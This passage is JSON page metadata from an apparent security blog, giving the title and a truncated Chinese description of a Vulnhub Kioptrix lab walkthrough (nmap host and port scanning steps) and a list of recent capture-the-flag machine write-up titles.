2","date":"2025-04-02","updated":"2025-04-02","comments":true,"tags":["Vulnhub"],"categories":"靶机","description":"Kioptrix: Level 1.2\n\n https://www.vulnhub.com/entry/kioptrix-level-12-3,24/\n \n\n主机发现端口扫描\n\n1. 使用nmap扫描网段类存活主机\n    \n    因为靶机是我最后添加的，所以靶机IP是`169`\n    \n    \n    \n2. 扫描主机开放端口\n    \n    \n    \n3. 扫描主机服务版本以及系统版..."},"recentPosts":[{"id":"HackTheBoxSeason8 - Signed","title":"HackTheBox - Season8 - Signed","date":"2025-10-14","isEncrypted":true,"year":"2025","month":"10","day":"14"},{"id":"HackTheBoxSeason8 - Certificate","title":"HackTheBox - Machine - Certificate","date":"2025-06-02","isEncrypted":false,"year":"2025","month":"10","day":"13"},{"id":"HackTheBoxSeason9 - Imagery","title":"HackTheBox - Season9 - Imagery","date":"2025-10-04","isEncrypted":true,"year":"2025","month":"10","day":"04"},{"id":"TheHackersLabsTortuga","title":"TheHackersLabs - Tortuga","date":"2025-10-01","isEncrypted":false,"year":"2025","month":"10","day":"01"},{"id":"TheHackersLabsElevator","title":"TheHackersLabs - Elevator","date":"2025-09-29","isEncrypted":false,"year":"2025","month":"09","day":"29"},{"id":"TheHackersLabsPa Que Aiga Lujo","title":"TheHackersLabs - Pa Que Aiga Lujo","date":"2025-09-28","isEncrypted":false,"year":"2025","month":"09","day":"28"},{"id":"HackMyVMSilentdev","title":"HackMyVM - Silentdev","date":"2025-09-26","isEncrypted":false,"year":"2025","month":"09","day":"26"}]},"__N_SSG":true}